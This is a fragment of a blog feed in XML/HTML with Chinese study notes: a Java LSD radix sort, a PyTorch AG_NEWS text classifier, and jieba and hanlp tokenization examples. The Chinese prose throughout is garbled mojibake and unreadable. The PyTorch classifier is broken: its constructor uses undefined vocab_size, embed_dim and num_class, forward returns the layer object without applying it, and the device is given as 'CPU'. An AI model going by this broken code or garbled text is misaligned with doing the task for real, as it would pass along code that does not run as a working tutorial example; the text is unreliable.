¹æ®é”®å€¼çš„æ¯ä½æ•°å­—æ¥åˆ†é…æ¡¶ï¼›</li><li>è®¡æ•°æ’åºï¼šæ¯ä¸ªæ¡¶åªå­˜å‚¨å•ä¸€é”®å€¼ï¼›</li><li>æ¡¶æ’åºï¼šæ¯ä¸ªæ¡¶å­˜å‚¨ä¸€å®šèŒƒå›´çš„æ•°å€¼ï¼›</li></ul><p><img src="/Pictures/CS61b/02/radixSort.gif" alt="radixSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lsdRadixSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-comment">// ç¡®å®šå…³é”®å­—çš„ä½æ•°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">maxDigits</span> <span class="hljs-operator">=</span> getMaxDigits(arr);<br><br>        <span class="hljs-comment">// è¿›è¡Œ LSD åŸºæ•°æ’åº</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">digit</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; digit &lt;= maxDigits; digit++) &#123;<br>            countingSort(arr, digit);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMaxDigits</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">maxDigits</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>            maxDigits = Math.max(maxDigits, getDigitCount(num));<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxDigits;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDigitCount</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (num != <span class="hljs-number">0</span>) &#123;<br>            count++;<br>            num /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">countingSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> digit)</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BASE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">// åŸºæ•°ä¸º 10ï¼Œè¡¨ç¤ºåè¿›åˆ¶æ•°</span><br><br>        <span class="hljs-type">int</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length];<br>        <span class="hljs-type">int</span>[] count = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[BASE];<br><br>        <span class="hljs-comment">// ç»Ÿè®¡å½“å‰ä½ä¸Šæ¯ä¸ªæ•°å­—å‡ºç°çš„æ¬¡æ•°</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">digitValue</span> <span class="hljs-operator">=</span> getDigitValue(num, digit);<br>            count[digitValue]++;<br>        &#125;<br><br>        <span class="hljs-comment">// å°† count æ•°ç»„è½¬æ¢ä¸ºæ¯ä¸ªæ•°å­—åœ¨è¾“å‡ºæ•°ç»„ä¸­çš„èµ·å§‹ä½ç½®</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; BASE; i++) &#123;<br>            count[i] += count[i - <span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-comment">// ä»å³å‘å·¦éå†åŸæ•°ç»„ï¼Œå°†æ•°å­—æ”¾å…¥æ­£ç¡®çš„ä½ç½®</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> arr.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> arr[i];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">digitValue</span> <span class="hljs-operator">=</span> getDigitValue(num, digit);<br>            output[count[digitValue] - <span class="hljs-number">1</span>] = num;<br>            count[digitValue]--;<br>        &#125;<br>        System.arraycopy(output, <span class="hljs-number">0</span>, arr, <span class="hljs-number">0</span>, arr.length);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDigitValue</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span> digit)</span> &#123;<br>        <span class="hljs-keyword">return</span> (num / (<span class="hljs-type">int</span>) Math.pow(<span class="hljs-number">10</span>, digit - <span class="hljs-number">1</span>)) % <span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="My-Thoughts"><a href="#My-Thoughts" class="headerlink" title="My Thoughts"></a>My Thoughts</h1><p><strong>Coming soon</strong></p><p><img src="/Pictures/CS61b/02/end.png" alt="end"></p>]]></content>
    
    
    <categories>
      
      <category>CS61b</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ–°é—»ä¸»é¢˜åˆ†ç±»</title>
    <link href="/2024/02/25/06-%E6%96%B0%E9%97%BB%E4%B8%BB%E9%A2%98%E5%88%86%E7%B1%BB/"/>
    <url>/2024/02/25/06-%E6%96%B0%E9%97%BB%E4%B8%BB%E9%A2%98%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨æµ…å±‚ç¥ç»ç½‘ç»œæ„å»ºæ–°é—»ä¸»é¢˜åˆ†ç±»å™¨çš„å®ç°è¿‡ç¨‹ã€‚</p><p>æ•°æ®é›†ä½¿ç”¨ <em>torchtext.datasets.AG_NEWS</em></p><p>æ•°æ®é›†ä¸­åŒ…å«äº†</p><ul><li>World</li><li>Sports</li><li>Business</li><li>Sci&#x2F;Tech</li></ul><p>è¿™å››ç§ç±»åˆ«ï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯è®­ç»ƒæ¨¡å‹å¯¹æ•°æ®è¿›è¡Œåˆ†ç±»ã€‚</p><p>ç¥ç»ç½‘ç»œçš„è®­ç»ƒå’Œæ„å»ºå¤§è‡´åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>æ„å»ºå¸¦æœ‰Embeddingå±‚çš„æ–‡æœ¬åˆ†ç±»æ¨¡å‹</li><li>å¯¹æ•°æ®è¿›è¡Œbatchå¤„ç†</li><li>æ„å»ºè®­ç»ƒä¸éªŒè¯å‡½æ•°</li><li>è¿›è¡Œæ¨¡å‹è®­ç»ƒå’ŒéªŒè¯</li><li>æŸ¥çœ‹Embeddingå±‚åµŒå…¥çš„è¯å‘é‡</li></ol><h2 id="1-æ„å»ºå¸¦æœ‰Embeddingå±‚çš„æ–‡æœ¬åˆ†ç±»æ¨¡å‹"><a href="#1-æ„å»ºå¸¦æœ‰Embeddingå±‚çš„æ–‡æœ¬åˆ†ç±»æ¨¡å‹" class="headerlink" title="1.æ„å»ºå¸¦æœ‰Embeddingå±‚çš„æ–‡æœ¬åˆ†ç±»æ¨¡å‹"></a>1.æ„å»ºå¸¦æœ‰Embeddingå±‚çš„æ–‡æœ¬åˆ†ç±»æ¨¡å‹</h2><p>ä¸‹é¢æ˜¯å¯¹åŸºæœ¬ç½‘ç»œçš„æ„å»ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br>BATCH_SIZE = <span class="hljs-number">16</span><br>device = torch.device(<span class="hljs-string">&quot;cuda&quot;</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;CPU&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextSentiment</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, text</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        :param vocab_size:æ•´ä¸ªè¯­æ–™åŒ…å«çš„ä¸åŒè¯æ±‡æ€»æ•°</span><br><span class="hljs-string">        :param embed_dim:æŒ‡å®šè¯åµŒå…¥çš„ç»´åº¦</span><br><span class="hljs-string">        :param num_class:æ–‡æœ¬åˆ†ç±»çš„ç»´åº¦</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.embedding = nn.Embedding(vocab_size, embed_dim, sparse=<span class="hljs-literal">True</span>)<br>        self.fc = nn.Linear(embed_dim, num_class)<br>        self.init_weights()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">self</span>):<br>        initrange = <span class="hljs-number">0.5</span><br>        self.embedding.weight.data.uniform_(-initrange, initrange)<br>        self.fc.weight.data.uniform_(-initrange,initrange)<br>        self.fc.bias.data.zero_()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, text</span>):<br>        embedded = self.embedding(text)<br>        c = embedded.size(<span class="hljs-number">0</span>)<br>        embedded = embedded[:BATCH_SIZE*c]<br>        embedded = embedded.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>).unsqueeze(<span class="hljs-number">0</span>)<br>        embedded = F.avg_pool1d(embedded, kernel_size=c)<br>        <span class="hljs-keyword">return</span> self.fc<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡æœ¬é¢„å¤„ç†</title>
    <link href="/2024/02/24/NLP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/02/24/NLP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡æœ¬é¢„å¤„ç†ä»¥åŠå…¶ä½œç”¨"><a href="#æ–‡æœ¬é¢„å¤„ç†ä»¥åŠå…¶ä½œç”¨" class="headerlink" title="æ–‡æœ¬é¢„å¤„ç†ä»¥åŠå…¶ä½œç”¨"></a>æ–‡æœ¬é¢„å¤„ç†ä»¥åŠå…¶ä½œç”¨</h1><p>æ–‡æœ¬è¯­æ–™åœ¨è¾“é€ç»™æ¨¡å‹å‰ä¸€èˆ¬éœ€è¦ä¸€ç³»åˆ—çš„é¢„å¤„ç†å·¥ä½œï¼Œæ‰èƒ½ç¬¦åˆæ¨¡å‹è¾“å…¥çš„è¦æ±‚ï¼Œå¦‚ï¼šå°†æ–‡æœ¬è½¬åŒ–æˆæ¨¡å‹éœ€è¦çš„å¼ é‡ï¼Œè§„èŒƒå¼ é‡çš„å°ºå¯¸ç­‰ï¼Œè€Œä¸”ç§‘å­¦çš„æ–‡æœ¬é¢„å¤„ç†ç¯èŠ‚è¿˜å°†æœ‰æ•ˆæŒ‡å¯¼æ¨¡å‹è¶…å‚æ•°çš„é€‰æ‹©ï¼Œæå‡æ¨¡å‹çš„è¯„ä¼°æŒ‡æ ‡ã€‚</p><h1 id="æ–‡æœ¬é¢„å¤„ç†ä¸­åŒ…å«çš„ä¸»è¦ç¯èŠ‚"><a href="#æ–‡æœ¬é¢„å¤„ç†ä¸­åŒ…å«çš„ä¸»è¦ç¯èŠ‚" class="headerlink" title="æ–‡æœ¬é¢„å¤„ç†ä¸­åŒ…å«çš„ä¸»è¦ç¯èŠ‚"></a>æ–‡æœ¬é¢„å¤„ç†ä¸­åŒ…å«çš„ä¸»è¦ç¯èŠ‚</h1><ul><li>æ–‡æœ¬é¢„å¤„ç†çš„åŸºæœ¬æ–¹æ³•</li><li>æ–‡æœ¬å¼ é‡è¡¨ç¤ºæ–¹æ³•</li><li>æ–‡æœ¬è¯­æ–™çš„æ•°æ®åˆ†æ</li><li>æ–‡æœ¬ç‰¹å¾å¤„ç†</li><li>æ•°æ®å¢å¼ºæ–¹æ³•</li></ul><p>æˆ‘ä»¬ä¸»è¦é’ˆå¯¹ä¸­æ–‡å’Œè‹±æ–‡è¿›è¡Œå¤„ç†</p><h1 id="1-æ–‡æœ¬é¢„å¤„ç†çš„åŸºæœ¬æ–¹æ³•"><a href="#1-æ–‡æœ¬é¢„å¤„ç†çš„åŸºæœ¬æ–¹æ³•" class="headerlink" title="1.æ–‡æœ¬é¢„å¤„ç†çš„åŸºæœ¬æ–¹æ³•"></a>1.æ–‡æœ¬é¢„å¤„ç†çš„åŸºæœ¬æ–¹æ³•</h1><h2 id="åˆ†è¯"><a href="#åˆ†è¯" class="headerlink" title="åˆ†è¯"></a>åˆ†è¯</h2><p><a href="https://github.com/fxsjy/jieba">https://github.com/fxsjy/jieba</a></p><p>jiebaåº“å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¯¹å¥å­è¿›è¡Œåˆ‡åˆ†ï¼Œä½œä¸ºTokenizerä½¿ç”¨ã€‚</p><ol><li>ç²¾ç¡®æ¨¡å¼ï¼šå°†å¥å­æœ€ç²¾ç¡®çš„åˆ‡å¼€ï¼ˆcut_all &#x3D; Falseï¼‰</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba<br>content = <span class="hljs-string">&quot;åšå†³ç»´æŠ¤ä¹ è¿‘å¹³æ€»ä¹¦è®°å…šä¸­å¤®çš„æ ¸å¿ƒã€å…¨å…šçš„æ ¸å¿ƒåœ°ä½ï¼Œåšå†³ç»´æŠ¤å…šä¸­å¤®æƒå¨å’Œé›†ä¸­ç»Ÿä¸€é¢†å¯¼ã€‚&quot;</span><br>jieba.cut(content, cut_all=<span class="hljs-literal">False</span>)    <span class="hljs-comment">#cut_allé»˜è®¤ä¸ºFalse</span><br><br><span class="hljs-comment"># å°†è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡</span><br><span class="hljs-comment"># &lt;generator object Tokenizer.cut at ......&gt;</span><br><br><span class="hljs-comment"># ä¹Ÿå¯ç›´æ¥è¿”å›åˆ—è¡¨å†…å®¹</span><br>out = jieba.lcut(content, cut_all=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(out)<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;ä¹ è¿‘å¹³</span>&#x27;, <span class="hljs-symbol">&#x27;æ€»ä¹¦è®°</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;ã€</span>&#x27;, <span class="hljs-symbol">&#x27;å…¨å…š</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;åœ°ä½</span>&#x27;, <span class="hljs-symbol">&#x27;ï¼Œ</span>&#x27;, <span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;æƒå¨</span>&#x27;, <span class="hljs-symbol">&#x27;å’Œ</span>&#x27;, <span class="hljs-symbol">&#x27;é›†ä¸­ç»Ÿä¸€</span>&#x27;, <span class="hljs-symbol">&#x27;é¢†å¯¼</span>&#x27;, <span class="hljs-symbol">&#x27;ã€‚</span>&#x27;]<br></code></pre></td></tr></table></figure><ol start="2"><li>å…¨æ¨¡å¼åˆ†è¯ï¼šæŠŠå¥å­ä¸­æ‰€æœ‰å¯ä»¥æˆè¯çš„è¯è¯­éƒ½æ‰«æå‡ºæ¥ï¼Œé€Ÿåº¦å¿«ä½†ä¼šäº§ç”Ÿæ­§ä¹‰ã€‚</li></ol><p>å°†å˜é‡ <em>cut_all &#x3D; Ture</em> ,è¾“å‡ºä¸‹é¢ç»“æœï¼š</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;ä¹ è¿‘å¹³</span>&#x27;, <span class="hljs-symbol">&#x27;æ€»ä¹¦è®°</span>&#x27;, <span class="hljs-symbol">&#x27;ä¹¦è®°</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;ã€</span>&#x27;, <span class="hljs-symbol">&#x27;å…¨å…š</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;å¿ƒåœ°</span>&#x27;, <span class="hljs-symbol">&#x27;åœ°ä½</span>&#x27;, <span class="hljs-symbol">&#x27;ï¼Œ</span>&#x27;, <span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;æƒå¨</span>&#x27;, <span class="hljs-symbol">&#x27;å’Œ</span>&#x27;, <span class="hljs-symbol">&#x27;é›†ä¸­</span>&#x27;, <span class="hljs-symbol">&#x27;é›†ä¸­ç»Ÿä¸€</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­ç»Ÿ</span>&#x27;, <span class="hljs-symbol">&#x27;ç»Ÿä¸€</span>&#x27;, <span class="hljs-symbol">&#x27;é¢†å¯¼</span>&#x27;, <span class="hljs-symbol">&#x27;ã€‚</span>&#x27;]<br></code></pre></td></tr></table></figure><ol start="3"><li>æœç´¢å¼•æ“æ¨¡å¼åˆ†è¯ï¼šå¯¹é•¿è¯å†æ¬¡åˆ‡åˆ†ï¼Œæé«˜å¬å›ç‡ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">out = jieba.lcut_for_search(content)<br><span class="hljs-built_in">print</span>(out)<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;ä¹ è¿‘å¹³</span>&#x27;, <span class="hljs-symbol">&#x27;ä¹¦è®°</span>&#x27;, <span class="hljs-symbol">&#x27;æ€»ä¹¦è®°</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;ã€</span>&#x27;, <span class="hljs-symbol">&#x27;å…¨å…š</span>&#x27;, <span class="hljs-symbol">&#x27;çš„</span>&#x27;, <span class="hljs-symbol">&#x27;æ ¸å¿ƒ</span>&#x27;, <span class="hljs-symbol">&#x27;åœ°ä½</span>&#x27;, <span class="hljs-symbol">&#x27;ï¼Œ</span>&#x27;, <span class="hljs-symbol">&#x27;åšå†³</span>&#x27;, <span class="hljs-symbol">&#x27;ç»´æŠ¤</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;å…šä¸­å¤®</span>&#x27;, <span class="hljs-symbol">&#x27;æƒå¨</span>&#x27;, <span class="hljs-symbol">&#x27;å’Œ</span>&#x27;, <span class="hljs-symbol">&#x27;é›†ä¸­</span>&#x27;, <span class="hljs-symbol">&#x27;ä¸­ç»Ÿ</span>&#x27;, <span class="hljs-symbol">&#x27;ç»Ÿä¸€</span>&#x27;, <span class="hljs-symbol">&#x27;é›†ä¸­ç»Ÿä¸€</span>&#x27;, <span class="hljs-symbol">&#x27;é¢†å¯¼</span>&#x27;, <span class="hljs-symbol">&#x27;ã€‚</span>&#x27;]<br></code></pre></td></tr></table></figure><ol start="4"><li>ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰è¯å…¸ï¼š</li></ol><ul><li>æ·»åŠ è‡ªå®šä¹‰è¯å…¸åï¼Œjiebaèƒ½å¤Ÿå‡†ç¡®è¯†åˆ«è¯å…¸ä¸­å‡ºç°çš„è¯æ±‡ï¼Œæå‡æ•´ä½“çš„è¯†åˆ«å‡†ç¡®ç‡</li><li>è¯å…¸æ ¼å¼ï¼šæ¯ä¸€è¡Œåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼ˆè¯è¯­ï¼Œè¯é¢‘ï¼Œè¯æ€§ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œé¡ºåºä¸å¯æ¢ï¼‰</li></ul><h2 id="æµè¡Œä¸­è‹±æ–‡åˆ†è¯å™¨hanlp"><a href="#æµè¡Œä¸­è‹±æ–‡åˆ†è¯å™¨hanlp" class="headerlink" title="æµè¡Œä¸­è‹±æ–‡åˆ†è¯å™¨hanlp"></a>æµè¡Œä¸­è‹±æ–‡åˆ†è¯å™¨hanlp</h2><ul><li>ä¸­è‹±æ–‡NLPå¤„ç†å·¥å…·åŒ…ï¼ŒåŸºäºtensorflow2.0ï¼Œä½¿ç”¨åœ¨å­¦æœ¯å’Œè¡Œä¸šä¸­æ¨å¹¿æœ€å…ˆè¿›çš„æ·±åº¦å­¦ä¹ æŠ€æœ¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hanlp<br>tokenizer = hanlp.load(<span class="hljs-string">&#x27;CTB6_CONVSEG&#x27;</span>)<br><span class="hljs-built_in">input</span> = <span class="hljs-string">&#x27;å­¦å†ä¸ä½†æ˜¯æ•²é—¨ç –ï¼Œä¹Ÿæ˜¯æˆ‘ä¸‹ä¸æ¥çš„é«˜å°ï¼Œæ›´æ˜¯å­”ä¹™å·±è„±ä¸ä¸‹çš„é•¿è¡«ã€‚&#x27;</span><br>tokenizer(<span class="hljs-built_in">input</span>)<br></code></pre></td></tr></table></figure><h2 id="å‘½åå®ä½“çš„è¯†åˆ«"><a href="#å‘½åå®ä½“çš„è¯†åˆ«" class="headerlink" title="å‘½åå®ä½“çš„è¯†åˆ«"></a>å‘½åå®ä½“çš„è¯†åˆ«</h2><p>å¯¹å¥å­è¿›è¡Œåˆ‡åˆ†ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå‘½åå®ä½“çš„è¯†åˆ«</p><ul><li><p>å‘½åå®ä½“ï¼šé€šå¸¸æˆ‘ä»¬å°†äººåã€åœ°åã€æœºæ„åç­‰ä¸“æœ‰åè¯ç»Ÿç§°ä¸ºå‘½åå®ä½“ã€‚å‘½åå®ä½“è¯†åˆ«ï¼ˆNamed Entity Recognitionï¼‰å°±æ˜¯è¯†åˆ«å‡ºä¸€æ®µæ–‡æœ¬ä¸­å¯èƒ½çš„å‘½åå®ä½“ã€‚</p></li><li><p>å‘½åå®ä½“æ˜¯äººç±»ç†è§£æ–‡æœ¬çš„åŸºç¡€å•å…ƒï¼Œä¹Ÿæ˜¯AIè§£å†³NLPé¢†åŸŸé«˜é˜¶ä»»åŠ¡çš„é‡è¦åŸºç¡€ç¯èŠ‚ã€‚</p></li></ul><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨hanlpè¿›è¡Œä¸­æ–‡å‘½åå®ä½“çš„è¯†åˆ«ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hanlp<br>recognizer = hanlp.load(hanlp.pretrained.ner.MSRA_NER_BERT_BASE_ZH)<br></code></pre></td></tr></table></figure><h2 id="è¯æ€§æ ‡æ³¨ï¼ˆPart-Of-Speech-taggingï¼‰"><a href="#è¯æ€§æ ‡æ³¨ï¼ˆPart-Of-Speech-taggingï¼‰" class="headerlink" title="è¯æ€§æ ‡æ³¨ï¼ˆPart-Of-Speech taggingï¼‰"></a>è¯æ€§æ ‡æ³¨ï¼ˆPart-Of-Speech taggingï¼‰</h2><ul><li>è¯æ€§æ ‡æ³¨ä»¥åˆ†è¯ä¸ºåŸºç¡€ï¼Œæ˜¯å¯¹æ–‡æœ¬è¯­è¨€çš„å¦ä¸€ä¸ªè§’åº¦çš„ç†è§£ï¼Œä¹Ÿå¸¸å¸¸ç§°ä¸ºAIè§£å†³NLPé¢†åŸŸçš„é«˜é˜¶ä»»åŠ¡çš„é‡è¦åŸºç¡€ç¯èŠ‚ã€‚</li></ul><p>ä½¿ç”¨jiebaè¿›è¡Œä¸­æ–‡è¯æ€§æ ‡æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> 